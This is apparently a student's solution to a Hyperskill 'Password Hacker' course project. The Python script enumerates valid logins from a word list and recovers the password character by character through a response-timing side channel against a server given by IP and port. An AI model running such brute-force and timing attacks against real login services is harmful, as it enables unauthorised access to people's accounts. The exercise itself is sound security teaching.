""" Hyperskill: Password Hacker with Python
Stage 5/5:  Time-based vulnerability
Difficulty: Hard (Graduate Project)
Track:      Python Core
Author:     Rixyn
Completed:  2024-02-04
"""


import socket
import sys
import json
import time
from itertools import product
from string import ascii_letters, digits

# Parse command-line arguments for IP address and port
if len(sys.argv) != 3:
    print("Usage: script.py <ip> <port>")
    sys.exit(1)

ip_address, port = sys.argv[1], int(sys.argv[2])

# Establish a connection to the server
client_socket = socket.socket()
try:
    client_socket.connect((ip_address, port))
except Exception as e:
    print(f"Error connecting to the server: {e}")
    sys.exit(1)


def find_correct_login(socket):
    with open("logins.txt", "r") as file:
        for login in file:
            login = login.strip()
            data = json.dumps({"login": login, "password": " "}).encode()
            socket.send(data)
            response = json.loads(socket.recv(1024).decode())
            if response["result"] == "Wrong password!":
                return login
    return ""


def find_correct_password(socket, login):
    password = ""
    charset = ascii_letters + digits
    while True:
        for char in charset:
            test_pass = password + char
            data = json.dumps({"login": login, "password": test_pass}).encode()
            start_time = time.time()  # Measure time before sending data
            socket.send(data)
            response = json.loads(socket.recv(1024).decode())
            end_time = time.time()  # Measure time after getting response
            response_time = end_time - start_time

            # Assume a threshold for deciding if response time indicates a correct prefix
            if response_time >= 0.1:
                password += char
                break
            elif response["result"] == "Connection success!":
                return test_pass


login = find_correct_login(client_socket)
password = find_correct_password(client_socket, login)

# Print the correct login and password in JSON format
print(json.dumps({"login": login, "password": password}))

client_socket.close()  # Close the socket connection
